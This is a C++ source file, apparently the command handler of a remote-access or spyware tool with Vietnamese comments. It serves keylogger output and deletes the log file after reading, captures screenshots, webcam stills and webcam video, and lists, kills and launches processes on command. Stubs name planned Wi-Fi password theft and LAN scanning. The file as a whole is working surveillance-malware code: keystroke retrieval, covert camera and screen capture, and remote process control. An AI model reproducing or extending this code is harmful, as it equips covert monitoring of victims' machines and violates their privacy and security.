#include "core/dispatcher.hpp"
#include "modules/process.hpp"
#include "modules/screen.hpp"
#include "modules/camera.hpp"

#include <iostream>
#include <fstream>
#include <cstdio> // Cho std::remove
#include <cerrno> // Cho ENOENT (Error No Entry)

#define KEYLOGGER_FILE_NAME "keylogger.txt"
Json Dispatcher::handle(const Json& request)
{
    std::cout << "[Dispatcher] Incoming request: " << request.dump() << "\n";

    Json res;
    std::string cmd = request.value("cmd", "");

    if (cmd.empty()) {
        res["status"] = "error";
        res["error"] = "missing_command";
        res["message"] = "Field 'cmd' is required.";
        return res;
    }

    try {
        if (cmd == "ping") {
            res = handle_ping(request);
        }
        else if (cmd == "process_list") {
            res = handle_process_list(request);
        }
        else if (cmd == "process_kill") {
            res = handle_process_kill(request);
        }
        else if (cmd == "process_start") {
            res = handle_process_start(request);
        }
        else if (cmd == "screen") {
            res = handle_screen(request);
        }
        else if (cmd == "camera") {
            res = handle_camera(request);
        }
        else if (cmd == "camera_video") {
            res = handle_camera_video(request);
        }
        else if (cmd == "screen_stream") {
            res = handle_screen_stream(request);
        }
        else if (cmd == "getkeylogs") {
            res = handle_getkeylogs(request);
        }
        else if (cmd == "clearlogs") {
            res = handle_clearlogs(request);
        }
        else if (cmd == "cancel_all" || cmd == "reset") {
            res = handle_cancel_all(request);
        }
        else if (cmd == "sysinfo" || cmd == "scanlan" || cmd == "wifi-pass" || cmd == "download-file" || cmd == "list-files" || cmd == "delete-file") {
             res["cmd"] = cmd;
             res["status"]  = "error";
             res["message"] = "Command '" + cmd + "' is not yet implemented in the backend.";
        } else {
            res["status"] = "error";
            res["error"] = "unknown_command";
            res["message"] = "Unknown command '" + cmd + "'";
        }
    }
    catch (const std::exception& e) {
        res["status"]  = "error";
        res["error"] = "exception";
        res["message"] = std::string("Exception: ") + e.what();
    }

    if (!res.contains("cmd")) {
        res["cmd"] = cmd;
    }

    return res;
}

// ----------------------- HANDLERS -----------------------
Json Dispatcher::handle_getkeylogs(const Json&)
{
    std::ifstream ifs(KEYLOGGER_FILE_NAME, std::ios::in);
    Json resp;
    resp["cmd"] = "getkeylogs";

    if (!ifs.is_open()) {
        resp["status"] = "ok";
        // Nếu file không tồn tại, trả về kết quả rỗng (UI sẽ hiển thị)
        resp["result"] = "--- Log file not found or empty. ---";
        return resp;
    }

    // Đọc toàn bộ nội dung file
    std::string content((std::istreambuf_iterator<char>(ifs)),
                        std::istreambuf_iterator<char>());
    ifs.close();
    
    // Tự động xóa file sau khi đọc (theo yêu cầu UI)
    if (std::remove(KEYLOGGER_FILE_NAME) != 0) {
        std::cerr << "[Dispatcher] Warning: Failed to delete keylogger file after reading. Error: " << errno << "\n";
    }

    resp["status"] = "ok";
    resp["result"] = content;
    return resp;
}

Json Dispatcher::handle_clearlogs(const Json&)
{
    Json resp;
    resp["cmd"] = "clearlogs";

    if (std::remove(KEYLOGGER_FILE_NAME) != 0) {
        // Kiểm tra lỗi, ENOENT (File not found) là lỗi OK (vì mục đích là xóa)
        if (errno == ENOENT) {
            resp["status"] = "ok";
            resp["message"] = "Log file already deleted or not found.";
        } else {
            resp["status"] = "error";
            resp["message"] = "Failed to delete log file.";
        }
    } else {
        resp["status"] = "ok";
        resp["message"] = "Log file cleared successfully.";
    }
    return resp;
}

Json Dispatcher::handle_ping(const Json&)
{
    return {
        {"cmd", "ping"},
        {"status", "ok"},
        {"message", "pong"}
    };
}

Json Dispatcher::handle_process_list(const Json&)
{
    ProcessManager pm;
    Json res = pm.list_processes();
    res["cmd"] = "process_list";
    return res;
}

Json Dispatcher::handle_process_kill(const Json& req)
{
    if (!req.contains("pid") || !req["pid"].is_number_integer()) {
        return {
            {"cmd", "process_kill"},
            {"status", "error"},
            {"error", "invalid_pid"},
            {"message", "Missing or invalid 'pid'"}
        };
    }

    int pid = req["pid"];
    if (pid < 0) {
        return {
            {"cmd", "process_kill"},
            {"status", "error"},
            {"message", "Missing or invalid 'pid'"}
        };
    }

    ProcessManager pm;
    Json res = pm.kill_process(pid);
    res["cmd"] = "process_kill";
    return res;
}

Json Dispatcher::handle_process_start(const Json& req)
{
    if (!req.contains("path") || !req["path"].is_string()) {
        return {
            {"cmd", "process_start"},
            {"status", "error"},
            {"message", "Missing or invalid 'path'"}
        };
    }

    std::string path = req["path"].get<std::string>();
    ProcessManager pm;
    Json res = pm.start_process(path);
    res["cmd"] = "process_start";
    return res;
}

Json Dispatcher::handle_screen(const Json&)
{
    std::string b64 = ScreenCapture::capture_base64();

    return {
        {"cmd", "screen"},
        {"status", "ok"},
        {"image_base64", b64}
    };
}

Json Dispatcher::handle_camera(const Json& req)
{
    Camera cam;
    std::string b64;

    if (cam.captureFrame(b64)) {
        Json resp;
        resp["cmd"] = "camera";
        resp["status"] = "ok";
        resp["image_base64"] = b64;
        return resp;
    }

    Json err;
    err["cmd"] = "camera";
    err["status"] = "error";
    err["error"] = "camera_failed";
    return err;
}

Json Dispatcher::handle_camera_video(const Json& req)
{
    int duration = 10;
    if (req.contains("duration") && req["duration"].is_number_integer()) {
        duration = req["duration"];
        if (duration <= 0) duration = 10;
        if (duration > 30) duration = 30; // tránh gửi video quá dài
    }

    Camera cam;
    std::string b64video;
    std::string format;

    if (!cam.captureVideo(duration, b64video, format)) {
        Json err;
        err["cmd"] = "camera_video";
        err["status"] = "error";
        err["error"] = "camera_video_failed";
        return err;
    }

    Json resp;
    resp["cmd"] = "camera_video";
    resp["status"] = "ok";
    resp["format"] = format;          // "avi"
    resp["video_base64"] = b64video;
    return resp;
}

Json Dispatcher::handle_screen_stream(const Json& req)
{
    int duration = 5;
    int fps = 3;

    if (req.contains("duration") && req["duration"].is_number_integer())
        duration = req["duration"];

    if (req.contains("fps") && req["fps"].is_number_integer())
        fps = req["fps"];

    if (duration < 1) duration = 1;
    if (duration > 60) duration = 60;
    if (fps < 1) fps = 1;
    if (fps > 30) fps = 30;

    Json resp;
    resp["cmd"] = "screen_stream";
    resp["status"] = "accepted";
    resp["message"] = "Screen stream request accepted";
    resp["duration"] = duration;
    resp["fps"] = fps;

    return resp;
}

Json Dispatcher::handle_cancel_all(const Json& req)
{
    std::string cmd = req.value("cmd", "cancel_all");
    Json resp;
    resp["cmd"] = cmd;
    resp["status"] = "ok";
    resp["message"] = "Cancel request acknowledged for this session.";
    return resp;
}
